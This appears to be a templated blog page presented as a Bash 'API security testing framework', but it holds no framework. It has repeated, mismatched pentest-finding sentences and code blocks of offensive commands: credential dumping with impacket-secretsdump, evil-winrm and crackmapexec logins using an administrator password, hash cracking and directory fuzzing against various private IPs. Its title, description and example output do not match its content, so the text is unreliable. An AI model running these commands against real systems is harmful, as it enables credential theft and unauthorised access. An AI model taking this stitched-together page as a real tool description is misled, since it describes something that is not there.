---
TitleSEO: "API Security Testing Framework in Bash | ZureFX"
TitlePost: "API Security Testing Framework — Bash"
Author: "ZureFX"
Description: "A Bash script for api security testing framework. Built for security research and automation."
Keywords: "bash, tool, parser"
URL: "https://zurefx.github.io/scripting/script-api-security-testing-framework-985.html"
URL_IMAGES: ""
Date: "2024-10-03"
Tags: "Bash, Tool, Parser"
Section: "scripting"
Lang: "en"
main_img: "script-api-security-testing-framework-985"
Permalink: "/scripting/script-api-security-testing-framework-985.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `feroxbuster`
- `lookupsid`
- `pwncat`

## Implementation

### Core Logic

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.52.10.10
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.118.223.45 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.110.134.226 -u administrator -p 'P@ssw0rd!' --shares
```

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
gobuster dir -u http://10.114.2.95/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.89.22.31/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality.

```bash
evil-winrm -i 10.40.166.108 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p5986,464,445 10.15.83.13 -oN scan.txt
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.44.120.214/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.23.94.88
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.57.15.132/FUZZ
gobuster dir -u http://10.61.187.99/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 4 results
[+] Done in 8.77s
```
